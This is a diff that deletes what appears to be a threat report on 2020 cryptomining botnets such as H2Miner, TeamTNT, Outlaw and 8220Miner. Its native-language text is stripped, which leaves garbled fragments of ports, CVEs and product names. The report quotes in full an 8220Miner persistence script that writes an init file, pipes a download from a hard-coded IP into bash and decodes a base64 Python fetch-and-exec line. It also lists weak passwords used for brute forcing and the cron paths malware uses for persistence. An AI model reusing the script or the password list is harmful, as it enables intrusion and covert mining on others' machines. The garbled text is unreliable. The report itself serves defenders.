@@ -1,139 +1,0 @@
-2020 
-
-2020  5 /BTC  9200  2019  10   6   6   
-coinmarketcap.com
-
-2020 
-2020 
- 2020  TOP   
- 1.
-1.1  TOP  2020  DTLMiner H2Miner GuardMiner                 DTLMiner
-
-NSABuffMinerNSAGluptebaMiner RedisHadoopWeblogic Drupalthinkphp  H2MinerGuardMinerz0Miner 8220Miner  KoiMiner 
-1.2    H2Miner  98% CPU 
-
-   DDoS   C2 
-   
-   
-  
-
-2. 2.1  RCE   TOP 
- 2020  RCE WebLogic CVE-2019-2725   
-
-
-
- Redis Hadoop Yarn RESET API Docker Remote API Kubernetes Jenkins XXL-JOB  phpMyAdmin Apache Flink Dashboard PostgreSQL
-
- 6379 8088 2375
-10255/10250 8080 9999 888 8081 5342
-
-  1Z0Miner  15 
- 2020  11  2  z0Miner  Weblogic           CVE-2020-14882/14883             Weblogic 2020.10.21 15 
-
-  
- 2redis  SuperManMiner 
- Redis   golang  superman  1 
- Redis  redis   redis  
- 3RunMiner  1.6 
- RunMiner  Apache Shiro  CVE-2016-4437RunMiner   shell  C2  Run.sh XMRig  tcpp  
-
- RunMiner ( 268.6KH/s)  16000  
-2.2    adminroottest111111123456   admin admin12 admin888 admin8 admin123 sysadmin adminxxx adminx root roots test test1 test123
-
-test2 password aaaAAA111 888888 88888888 000000 00000000 111111 11111111 aaaaaa aaaaaaaa 135246 135246789 123456
- 2020   SSHMssqlRedis  
-MS SQL GuardMiner MrbMinerBasedMiner
-
- GO 
-SSH  Ks3_MinerLoggerMiner8220MinerDDG
-Redis  H2MinerGuardMinerDDG
-Msql  Mykings
-2.3 
-    
- TOP  DTLMiner H2MinerGuardMiner  
-
-
- 2020  Linux  SSH  OutlawPrometei Docker Remote API  TeamTNT Nexus Repository Manager 3  Mysql Tomcat Weblogic  Sysrv-hello 
-
- 4TeamTNT
-
-
-
-TeamTNT  2375  Docker Remote API  TeamTNT  RSA AWS CLI  docker  C2  TeamTNT  SSH  
- 5Sysrv-hello  Sysrv-hello  Nexus Repository Manager 3 
-
- mysqlTomcat Weblogic  CVE-2020-14882 Linux  Windows 
- 6Outlaw                         Outlaw       Outlaw 2018  SSH   Perl  Shellbot  Outlaw 2  Linux   dota3.tar.gzOutlaw
-
- 3  shell kswapd0  tsm32tsm64  SSH 
-
-3.  
-3.1 Linux  WatchbogMiner 
-1  /etc/crontab /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.d/system /etc/cron.d/apache /etc/cron.d/root /etc/cron.hourly/oanacroane /etc/cron.daily/oanacroane /etc/cron.monthly/oanacroane
-
-2 crontab  3 at 
-
-4"/home/$me/.bashrc""/root/.bashrc"
-3.2 Linux  1WannaMine /etc/rc.d/init.d  
-28220Miner /etc/init.d/down 
-
-echo -e '#!/bin/bash
-
-### BEGIN INIT INFO
-
-# Provides:
-
-down
-
-# Required-Start:
-
-# Required-Stop:
-
-# Default-Start: 2 3 4 5
-
-# Default-Stop:
-
-# Short-Description: down (by pwned)
-
-### END INIT INFO
-
-(curl -fsSL hxxp://5.196.247.12/xms||wget -q -O- hxxp://5.196.247.12/xms)|bash -sh; echo
-
-cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8
-
-1LjE5Ni4yNDcuMTIvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download
-
-hxxp://5.196.247.12/xms /tmp/xms; bash /tmp/xms' > /etc/init.d/down
-
-3Muhstik /etc/inittab
-
-44SHMiner /etc/init.d/c3pool_miner 
-
-5  4SHMiner4SHMiner
-
-
-
-/etc/systemd/system/moneroocean_miner.service 
-
-3.3 Windows WMI KingMiner  WMI  WindowsSystemUpdate_WMITimer         WindowsSystemUpdate_consumer        WindowsSystemUpdate _filter  15 
-
-
-
-      
-
-
- 20   SOC 
- 
-
-4.1  1 Linux  SSH Windows SQL Server     Linux MysqlTomcat 
-2 RedisHadoop YarnDockerXXL-JOBPostgres  
-
-3 WeblogicApache StrutsApache FlinkThinkPHP      
-4.2   
-
- 1 CPU  100% Kill kill  shell 
-
-2/var/spool/cron/root/var/spool/cron/crontabs/root  
-3 Web 
-
-
